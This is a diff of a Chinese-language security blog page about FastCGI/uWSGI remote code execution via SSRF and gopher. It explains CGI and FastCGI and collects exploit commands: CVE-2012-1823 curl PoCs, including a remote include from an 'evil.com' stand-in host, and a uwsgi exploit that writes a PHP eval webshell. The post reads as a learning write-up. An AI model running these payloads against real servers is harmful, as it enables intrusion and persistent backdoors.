@@ -107,7 +107,7 @@
 <meta property="og:image" content="http://lypto.me/myimages/fastcgi_rce/run_uwsgi.png">
 <meta property="og:image" content="http://lypto.me/myimages/fastcgi_rce/curl_gopher.PNG">
 <meta property="og:image" content="http://lypto.me/myimages/fastcgi_rce/webshell.PNG">
-<meta property="og:updated_time" content="2018-12-20T11:20:22.353Z">
+<meta property="og:updated_time" content="2018-12-20T15:00:56.403Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="FastCGI RCE in SSRF">
 <meta name="twitter:description" content="在学习ssrf利用的时候，发现不少文章或者议题种提到了fastcgi的远程命令执行。所以本着学习的思路打算去看下相关的内容，参考链接是笔者认为对这一攻击形式讲解还不错的一些菊苣写的文章，特别是p神的深入解读，很值得一看。另外也找到了一些自动化利用的脚本，在参考链接[5]已经给出。这篇文章就当是自己对cgi,fastcgi,php-fpm,uwsgi这些名词的进一步理解。">
@@ -447,20 +447,17 @@
 <p>在学习ssrf利用的时候，发现不少文章或者议题种提到了fastcgi的远程命令执行。所以本着学习的思路打算去看下相关的内容，参考链接是笔者认为对这一攻击形式讲解还不错的一些菊苣写的文章，特别是p神的深入解读，很值得一看。另外也找到了一些自动化利用的脚本，在参考链接<code>[5]</code>已经给出。这篇文章就当是自己对cgi,fastcgi,php-fpm,uwsgi这些名词的进一步理解。</p>
 </blockquote>
 <a id="more"></a>
-<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>理解这个漏洞利用方式的一个前提是fastcgi暴露在了公网，当然不排除运维人员粗心大意的情况；但是更多的利用场景还是类似ssrf这样。在服务端开启gopher协议的情况下，我们可以直接通过fastcgi执行</p>
-<h1 id="cve-2012-1823"><a href="#cve-2012-1823" class="headerlink" title="cve-2012-1823"></a><code>cve-2012-1823</code></h1><p>下面是网上流传的<code>cve-2012-1823</code> 的poc,细节可以查看参考文献<code>[4]</code>，由于着两个payload具有一定的历史，限制条件比较多，必须限于两个php版本之间，至于为啥是限于两个版本之间，看了p神文章就会明白这里有段开发趣闻。就不展开了，这里仅仅把poc搜集在下面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 本地包含代码执行</span><br><span class="line">curl -H &quot;USER-AGENT: &lt;?system(&apos;id&apos;);die();?&gt;&quot; http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n </span><br><span class="line"></span><br><span class="line"># 远程包含代码执行</span><br><span class="line">curl http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</span><br></pre></td></tr></table></figure></p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>理解这个漏洞利用方式的一个前提是fastcgi暴露在了公网，当然不排除运维人员粗心大意的情况；但是更多的利用场景还是类似ssrf这样。在服务端开启gopher协议的情况下，我们可以直接通过fastcgi进行命令执行。</p>
+<h1 id="cve-2012-1823"><a href="#cve-2012-1823" class="headerlink" title="cve-2012-1823"></a><code>cve-2012-1823</code></h1><p>下面是网上流传的<code>cve-2012-1823</code> 的poc,细节可以查看参考文献<code>[4]</code>，由于这两个payload具有一定的历史，限制条件比较多，必须限于两个php版本之间，至于为啥是限于两个版本之间，看了p神文章就会明白这里有段开发趣闻。就不展开了，这里仅仅把poc搜集在下面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 本地包含代码执行</span><br><span class="line">curl -H &quot;USER-AGENT: &lt;?system(&apos;id&apos;);die();?&gt;&quot; http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n </span><br><span class="line"></span><br><span class="line"># 远程包含代码执行</span><br><span class="line">curl http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</span><br></pre></td></tr></table></figure></p>
 <h1 id="fastcgi与wsgi"><a href="#fastcgi与wsgi" class="headerlink" title="fastcgi与wsgi"></a>fastcgi与wsgi</h1><p>一直比较好奇fastcgi是个啥，着两天也是看了不少文章，然后结合自己的理解，才把这个概念弄明白。如果对通用网关接口（cgi）了解的话，就不难理解为fastcgi就是cgi的进阶版本。提供了更有效率的接口模式和进程管理，在ubuntu上可以<code>sudo apt install php-fpm</code>安装这个模块支持，否则默认的是PHP-CGI。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。</span><br><span class="line">FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似。</span><br><span class="line">PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。</span><br><span class="line">PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。</span><br></pre></td></tr></table></figure></p>
 <p>上面是针对php的fastcgi来说的，其实在python里面也有网关接口协议,现在可以知道fastcgi与wsgi很多程度上说的是协议，而php-fpm与php-cgi则可以理解为协议的具体实现。同样的在python里面有个实现了wsgi协议的服务器uWSGI，其内置协议就取名为uwsgi，其实是对wsgi的实现和拓展。所以某种层度上说，python里的uwsgi和php里的php-fpm地位十分相似。体现在他们都可以作为nginx 服务应用的接口，提供对python和php的脚本解析支持。</p>
 <p>说了这么多，那么我们为什么需要这些协议？</p>
-<p>可想而知，apache和nginx都是c语言写的程序，而很多服务器解析脚本是php，perl,python等，两个进程交互总得定义一下规范吧，所以这些协议就应运而生。那么为什么服务器不直接在一个语言里面实现呢？实现当然没问题！用过django的伙伴就有体会，其实django内置了一个小型服务器，实现了wsgi协议规范，但是我们实际部署的时候，往往不直接用它它内置的服务器裸奔在公网，而是弄个nginx服务器，然后nginx富足直接的与浏览器交互。读者认为这是分工，互相发挥优势的表现。试想，我们有了apache，nginx这样高性能稳定的可以处理高并发的服务器，让他们在前面处理请求，把接受的请求信息通过协议规范发给后台解析进程管理器，这样分工明确又能够发挥各自的优势，何乐不为？</p>
+<p>可想而知，apache和nginx都是c语言写的程序，而很多服务器解析脚本是php，perl,python等，两个进程交互总得定义一下规范吧，所以这些协议就应运而生。那么为什么服务器不直接在一个语言里面实现呢？实现当然没问题！用过django的伙伴就有体会，其实django内置了一个小型服务器，实现了wsgi协议规范，但是我们实际部署的时候，往往不直接用它它内置的服务器裸奔在公网，而是弄个nginx服务器，然后nginx负责直接的与浏览器交互。试想，我们有了apache，nginx这样高性能且稳定的可以处理高并发的服务器，那就让他们在前面处理请求好了，把接受的请求信息通过协议规范发给后台解析进程管理器，让进程管理器从进程池中启动一个进程并调用相应的脚本解释器。这样分工明确又能够发挥各自的优势，何乐不为？</p>
 <h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>上面说了一堆的背景知识。我们现在言归正传。php-fpm和uwsgi都是默认监听在本地的某个端口，等待前面服务器（是apache或者nginx）解析请求的到来。正因为它无条件的监听在本地某个端口，只要我们可以构造满足协议规范的请求包，就可以执行任意命令。而通过ssrf，利用gopher协议我们可以很轻松的让本地监听的php-fpm和uwsgi为我们所用。至于如何构造满足协议的包，p神写了一片很细很细的文章(<code>参考链接[3]</code>),当然还有自动化生成满足这些协议payload的工具。</p>
-<p>下面以python uwsgi为例，概念验证可以调用gopher协议写入webshell（有写入权限的情况下，本实验已经chmod 777 理想化过网站根目录，实际中需要找到上传目录），（网上已经有很多利用php fastcgi的demo，除此以外还可以直接弹shell,这里就展示了）</p>
-<p><code>nc -lvp 4444&gt;payload.txt</code></p>
-<p><code>python uwsgi_exp.py -u 127.0.0.1:4444 -c &quot;echo &#39;&lt;?php @eval($_POST[value]);?&gt;&#39; &gt;/var/www/html/webshell.php&quot;</code></p>
+<p>下面以python uwsgi为例，概念验证可以调用gopher协议写入webshell（有写入权限的情况下，本实验已经chmod 777 理想化过网站根目录，实际中需要找到上传目录），（网上已经有很多利用php fastcgi的demo，除此以外还可以直接弹shell,这里就展示了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444&gt;payload.txt</span><br><span class="line"></span><br><span class="line">python uwsgi_exp.py -u 127.0.0.1:4444 -c &quot;echo &apos;&lt;?php @eval($_POST[value]);?&gt;&apos; &gt;/var/www/html/webshell.php&quot;</span><br></pre></td></tr></table></figure></p>
 <p>使用脚本转换成gopher协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"> </span><br><span class="line">def genpayload():</span><br><span class="line">    f = open(&quot;payload.txt&quot;,&quot;br&quot;)</span><br><span class="line">    content = f.read()</span><br><span class="line">    print (urllib.request.quote(content))</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    genpayload()</span><br></pre></td></tr></table></figure></p>
 <p>下载uwsgi 并且运行uwsgi，模拟服务器中uwsgi运行，监听端口8001</p>
-<p><code>pip install uwsgi</code></p>
-<p><code>uwsgi --socket :8001</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi</span><br><span class="line"></span><br><span class="line">uwsgi --socket :8001</span><br></pre></td></tr></table></figure>
 <p><img src="/myimages/fastcgi_rce/run_uwsgi.png" alt="image"></p>
 <p><img src="/myimages/fastcgi_rce/curl_gopher.PNG" alt="image"></p>
 <p><img src="/myimages/fastcgi_rce/webshell.PNG" alt="image"></p>
@@ -511,7 +508,7 @@
   </li>
   <li class="post-copyright-author">
     <strong>最后更新:</strong>
-    2018年12月20日 - 19:12
+    2018年12月20日 - 23:12
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
@@ -559,6 +556,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/22/内网渗透中的端口转发/" rel="prev" title="内网渗透中的端口转发">
+                内网渗透中的端口转发 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -657,7 +658,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">35</span>
+                <span class="site-state-item-count">36</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -679,7 +680,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-count">39</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
